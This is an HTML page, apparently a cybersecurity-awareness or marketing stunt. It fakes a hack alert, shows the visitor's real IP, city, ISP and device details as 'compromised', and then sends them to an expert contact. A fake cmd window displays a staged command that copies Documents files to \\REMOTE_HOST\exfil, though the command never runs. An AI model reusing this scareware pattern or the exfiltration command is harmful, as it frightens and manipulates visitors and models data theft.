<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALERTE SÃ‰CURITÃ‰</title>
    <style>
        :root {
            --red: #FF0000;
            --dark-red: #1a0000;
            --green: #00FF41;
            --fb-blue: #1877F2;
            --bg: #000000;
            --terminal-bg: #0D0D0D;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            height: 100vh;
            color: white;
        }

        /* â”€â”€ Step 1: FB Snapshot â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #fake-fb {
            position: fixed; inset: 0;
            background: #F0F2F5;
            display: flex; flex-direction: column;
            z-index: 100;
        }
        .fb-header { height: 60px; background: white; border-bottom: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .fb-post { width: 500px; height: 400px; background: white; margin: 40px auto; border-radius: 8px; padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .fb-placeholder { background: #eee; height: 20px; margin-bottom: 15px; border-radius: 4px; }

        /* â”€â”€ Step 2: Glitch â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        .glitch-overlay {
            position: fixed; inset: 0; background: transparent;
            z-index: 101; pointer-events: none; display: none;
        }
        .glitch-active .glitch-overlay {
            display: block;
            animation: glitch-anim 0.2s infinite;
        }
        @keyframes glitch-anim {
            0%   { clip-path: inset(10% 0 30% 0); transform: translateX(-5px); filter: invert(1); }
            50%  { clip-path: inset(50% 0 10% 0); transform: translateX(5px);  filter: invert(0); }
            100% { clip-path: inset(20% 0 60% 0); transform: translateX(-2px); }
        }

        /* â”€â”€ Step 3/4: Trop Tard â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #trop-tard {
            position: fixed; inset: 0; background: black;
            z-index: 102; display: none;
            justify-content: center; align-items: center;
            color: var(--red); font-family: monospace;
            font-size: 2.5rem; opacity: 0;
        }

        /* â”€â”€ CMD Window (fires on act2 load too) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #cmd-window {
            position: fixed;
            bottom: 60px; right: 60px;
            width: 530px;
            background: #0C0C0C;
            border: 1px solid #666;
            z-index: 9500;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #CCCCCC;
            box-shadow: 4px 4px 20px rgba(0,0,0,0.95);
            display: none;
            opacity: 1;
        }
        .cmd-titlebar {
            background: #1a1a1a; padding: 5px 8px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #333;
        }
        .cmd-title-left { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #bbb; }
        .cmd-controls { display: flex; }
        .cmd-ctrl {
            width: 46px; height: 22px;
            display: flex; align-items: center; justify-content: center;
            font-size: 10px; color: #ccc;
        }
        .cmd-ctrl.close { color: #ccc; }
        .cmd-ctrl.close:hover { background: #c42b1c; color: white; }
        .cmd-body { padding: 8px 12px; line-height: 1.75; min-height: 150px; }
        .cmd-gray  { color: #AAAAAA; }
        .cmd-white { color: #FFFFFF; }
        .cmd-green { color: #00FF41; }
        .cmd-prompt { color: #CCCCCC; }

        /* â”€â”€ Step 5: Main Interface â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        #main-ui {
            position: relative; height: 100vh; width: 100%;
            display: none; opacity: 0;
            background: radial-gradient(ellipse at center, #1a0000 0%, #000000 70%);
            overflow-y: auto; padding-bottom: 100px;
            transition: opacity 0.8s ease;
        }
        #main-ui::before {
            content: " "; display: block;
            position: absolute; inset: 0;
            background: linear-gradient(rgba(18,16,16,0) 50%, rgba(0,0,0,0.25) 50%),
                        linear-gradient(90deg, rgba(255,0,0,0.06), rgba(0,255,0,0.02), rgba(0,0,255,0.06));
            z-index: 10; background-size: 100% 4px, 3px 100%;
            pointer-events: none;
        }

        .alert-banner {
            background: var(--dark-red); border-bottom: 1px solid var(--red);
            padding: 15px; text-align: center;
            font-family: monospace; color: var(--red);
            letter-spacing: 4px; animation: blink 0.8s infinite;
            position: sticky; top: 0; z-index: 20;
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }

        .terminal-card {
            max-width: 680px; width: 90%;
            background: var(--terminal-bg);
            border: 1px solid var(--red);
            box-shadow: 0 0 20px rgba(255,0,0,0.3);
            margin: 60px auto 20px; padding: 40px;
            border-radius: 4px; position: relative; z-index: 5;
        }
        .card-header { color: var(--red); font-family: monospace; letter-spacing: 2px; margin-bottom: 16px; }
        .separator { border-top: 1px solid var(--red); opacity: 0.4; margin-bottom: 20px; }

        .terminal-line {
            font-family: monospace; color: var(--green);
            font-size: 0.95rem; line-height: 2.2;
            white-space: pre-wrap; display: none;
        }
        .status-compromis {
            color: var(--red); font-weight: bold; font-size: 1.1em;
            animation: slow-blink 1.5s infinite;
        }
        @keyframes slow-blink { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }

        .darija-note {
            color: #AAAAAA; font-size: 0.9rem; text-align: center;
            max-width: 500px; margin: 20px auto; font-style: italic; opacity: 0;
        }

        #progress-section { width: 90%; max-width: 600px; margin: 20px auto; opacity: 0; }
        .progress-label { font-size: 0.8rem; margin-bottom: 8px; font-family: monospace; }
        .progress-container { width: 100%; height: 6px; background: #1a1a1a; border-radius: 3px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #FF0000, #FF6600); transition: width 3s cubic-bezier(0.1, 0, 0.1, 1); }
        .percentage { font-family: monospace; margin-left: 10px; font-size: 0.8rem; }

        #relief-section { max-width: 680px; margin: 0 auto; padding: 0 20px; text-align: center; opacity: 0; }
        .relief-sep { border-top: 1px solid #1a3a5c; margin: 40px 0; }
        .relief-text { font-size: 1.1rem; margin-bottom: 30px; }

        .cta-btn {
            background: transparent; border: 2px solid var(--fb-blue);
            color: var(--fb-blue); padding: 16px 32px; border-radius: 4px;
            font-family: monospace; cursor: pointer;
            transition: all 0.3s ease; text-decoration: none; display: inline-block;
            animation: pulse-blue 2s infinite;
        }
        .cta-btn:hover { background: var(--fb-blue); color: white; }
        @keyframes pulse-blue {
            0%   { box-shadow: 0 0 0 0 rgba(24,119,242,0.4); }
            70%  { box-shadow: 0 0 0 15px rgba(24,119,242,0); }
            100% { box-shadow: 0 0 0 0 rgba(24,119,242,0); }
        }

        .fade-out-white { position: fixed; inset: 0; background: white; z-index: 1000; display: none; opacity: 0; }
    </style>
</head>
<body class="glitch-active">

    <!-- Step 1: Fake FB Snapshot -->
    <div id="fake-fb">
        <div class="fb-header"></div>
        <div class="fb-post">
            <div class="fb-placeholder" style="width:40%;"></div>
            <div class="fb-placeholder" style="width:90%; height:200px;"></div>
            <div class="fb-placeholder" style="width:70%;"></div>
            <div class="fb-placeholder" style="width:30%; height:40px; margin-top:20px;"></div>
        </div>
    </div>

    <!-- Step 2: Glitch Layer -->
    <div class="glitch-overlay"></div>

    <!-- Step 3/4: Trop Tard -->
    <div id="trop-tard">Trop tard.</div>

    <!-- CMD Window â€” fires again on act2 load -->
    <div id="cmd-window">
        <div class="cmd-titlebar">
            <div class="cmd-title-left">
                <span>â¬›</span>
                <span>C:\Windows\System32\cmd.exe</span>
            </div>
            <div class="cmd-controls">
                <div class="cmd-ctrl">&#8722;</div>
                <div class="cmd-ctrl">&#9633;</div>
                <div class="cmd-ctrl close">&#10005;</div>
            </div>
        </div>
        <div class="cmd-body">
            <div class="cmd-gray">Microsoft Windows [Version 10.0.19045.4170]</div>
            <div class="cmd-gray">(c) Microsoft Corporation. Tous droits rÃ©servÃ©s.</div>
            <br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">ipconfig /all</span></div>
            <div class="cmd-green">Adresse IPv4. . . . . . . . . . . : 197.0.XXX.XXX</div>
            <div class="cmd-green">Passerelle par dÃ©faut. . . . . . : 192.168.1.1</div>
            <br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">copy C:\Users\Mohamed\Documents\* \\REMOTE_HOST\exfil /Y</span></div>
            <div class="cmd-green">127 fichier(s) copiÃ©(s).</div>
            <br>
            <div><span class="cmd-prompt">C:\Users\Mohamed&gt; </span><span class="cmd-white">_</span></div>
        </div>
    </div>

    <!-- Step 5: Main UI -->
    <div id="main-ui">
        <div class="alert-banner">âš ï¸  ALERTE SÃ‰CURITÃ‰ â€” INTRUSION DÃ‰TECTÃ‰E  âš ï¸</div>
        <div class="terminal-card">
            <div class="card-header">[ DONNÃ‰ES COLLECTÃ‰ES EN 3.2 SECONDES ]</div>
            <div class="separator"></div>
            <div id="terminal-content"></div>
        </div>
        <div class="darija-note" dir="auto">
            W ama ki yji wahd hacker hqiqi â€” yaamel akther beaucoup Ù…Ù† Ù‡Ø°Ø§. W nta maarafch.
        </div>
        <div id="progress-section">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <div class="progress-label">Transfert de donnÃ©es en cours...</div>
                <div class="percentage" id="perc">0%</div>
            </div>
            <div class="progress-container">
                <div class="progress-fill" id="fill"></div>
            </div>
        </div>
        <div id="relief-section">
            <div class="relief-sep"></div>
            <p class="relief-text">Heureusement â€” c'Ã©tait nous. Pas eux.</p>
            <a href="#" class="cta-btn" id="cta">Parler Ã  Si Moncef â€” Expert en CybersÃ©curitÃ© ğŸ›¡ï¸</a>
        </div>
    </div>

    <div class="fade-out-white" id="white-out"></div>

    <script>
        // â”€â”€â”€ Audio: keyboard click â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let audioCtx;
        function getAudioCtx() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            return audioCtx;
        }
        function playClick() {
            try {
                const ctx = getAudioCtx();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'square';
                osc.frequency.setValueAtTime(150, ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(10, ctx.currentTime + 0.1);
                gain.gain.setValueAtTime(0.05, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
                osc.connect(gain); gain.connect(ctx.destination);
                osc.start(); osc.stop(ctx.currentTime + 0.1);
            } catch(e) {}
        }

        // â”€â”€â”€ CMD Flash (different content from index.html â€” exfil) â”€â”€â”€
        function flashCMD(duration = 900) {
            const cmd = document.getElementById('cmd-window');
            cmd.style.display = 'block';
            cmd.style.opacity = '1';
            setTimeout(() => {
                cmd.style.transition = 'opacity 0.12s ease-out';
                cmd.style.opacity = '0';
                setTimeout(() => {
                    cmd.style.display = 'none';
                    cmd.style.opacity = '1';
                    cmd.style.transition = '';
                }, 120);
            }, duration);
        }

        // â”€â”€â”€ Main Init â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        async function init() {
            // Fetch real IP data
            let userData = {
                ip: '197.0.0.1', city: 'Tunis', isp: 'Topnet',
                res: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language,
                time: new Date().toLocaleTimeString()
            };
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                userData.ip   = data.ip   || userData.ip;
                userData.city = data.city || userData.city;
                userData.isp  = data.org  || userData.isp;
            } catch(e) {}

            // Parse browser & OS from userAgent
            const ua = navigator.userAgent;
            let browser = 'Navigateur inconnu';
            if (ua.includes('Firefox'))      browser = 'Firefox';
            else if (ua.includes('Edg'))     browser = 'Edge';
            else if (ua.includes('Chrome'))  browser = 'Chrome';
            else if (ua.includes('Safari'))  browser = 'Safari';
            let os = 'OS inconnu';
            if (ua.includes('Windows NT 10')) os = 'Windows 11/10';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac'))     os = 'macOS';
            else if (ua.includes('Linux'))   os = 'Linux';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone'))  os = 'iOS';

            const lines = [
                `> Adresse IP          :  ${userData.ip}`,
                `> Localisation        :  ${userData.city}, Tunisie ğŸ‡¹ğŸ‡³`,
                `> Fournisseur         :  ${userData.isp}`,
                `> Appareil            :  ${os} â€” ${browser}`,
                `> RÃ©solution Ã©cran    :  ${userData.res}`,
                `> Langue systÃ¨me      :  ${userData.lang}`,
                `> Heure locale        :  ${userData.time}`,
                `> Statut              :  <span class="status-compromis">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ COMPROMIS</span>`
            ];

            // â”€â”€ t=0: CMD flashes immediately (exfil hint) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            flashCMD(800);

            // â”€â”€ t=900ms: Hard cut to black â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            setTimeout(() => {
                document.getElementById('fake-fb').style.display = 'none';
                document.body.classList.remove('glitch-active');
                document.body.style.backgroundColor = '#000000';
            }, 900);

            // â”€â”€ t=1700ms: "Trop tard." â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            setTimeout(() => {
                const tt = document.getElementById('trop-tard');
                tt.style.display = 'flex';
                setTimeout(() => { tt.style.transition = 'opacity 0.5s'; tt.style.opacity = 1; }, 50);
                setTimeout(() => { tt.style.opacity = 0; }, 1200);
            }, 1700);

            // â”€â”€ t=3200ms: Main interface fades in â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            setTimeout(() => {
                document.getElementById('trop-tard').style.display = 'none';
                const main = document.getElementById('main-ui');
                main.style.display = 'block';
                setTimeout(() => { main.style.opacity = 1; }, 50);
                startTerminal(lines);
            }, 3200);
        }

        // â”€â”€â”€ Terminal Typewriter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function startTerminal(lines) {
            const container = document.getElementById('terminal-content');
            let lineIndex = 0;

            function typeLine() {
                if (lineIndex >= lines.length) return;
                const div = document.createElement('div');
                div.className = 'terminal-line';
                div.style.display = 'block';
                container.appendChild(div);

                const text = lines[lineIndex];
                const isHtml = text.includes('<span');
                let charIndex = 0;

                const interval = setInterval(() => {
                    if (isHtml && charIndex >= text.indexOf('<span')) {
                        div.innerHTML = text;
                        clearInterval(interval);
                        playClick();
                        finishLine();
                    } else {
                        div.innerHTML += text[charIndex];
                        playClick();
                        charIndex++;
                        if (charIndex >= text.length) { clearInterval(interval); finishLine(); }
                    }
                }, 18);
            }

            function finishLine() {
                lineIndex++;
                setTimeout(typeLine, 380);
                if (lineIndex === lines.length) showProgress();
            }

            typeLine();
        }

        // â”€â”€â”€ Progress Bar + Relief â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function showProgress() {
            setTimeout(() => {
                const note = document.querySelector('.darija-note');
                note.style.transition = 'opacity 1s';
                note.style.opacity = 1;
            }, 500);

            setTimeout(() => {
                const ps = document.getElementById('progress-section');
                ps.style.transition = 'opacity 1s'; ps.style.opacity = 1;

                setTimeout(() => {
                    const fill = document.getElementById('fill');
                    const percText = document.getElementById('perc');
                    fill.style.width = '83%';
                    let p = 0;
                    const pi = setInterval(() => {
                        p++; percText.innerText = p + '%';
                        if (p >= 83) clearInterval(pi);
                    }, 35);
                }, 100);

                setTimeout(showRelief, 4000);
            }, 1500);
        }

        function showRelief() {
            const relief = document.getElementById('relief-section');
            relief.style.transition = 'opacity 1.5s';
            relief.style.opacity = 1;
        }

        // â”€â”€â”€ CTA â†’ act_3.html â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        document.getElementById('cta').addEventListener('click', (e) => {
            e.preventDefault();
            const wo = document.getElementById('white-out');
            wo.style.display = 'block';
            setTimeout(() => { wo.style.transition = 'opacity 0.8s'; wo.style.opacity = 1; }, 10);
            setTimeout(() => { window.location.href = 'act_3.html'; }, 820);
        });

        window.onload = init;
    </script>
</body>
</html>
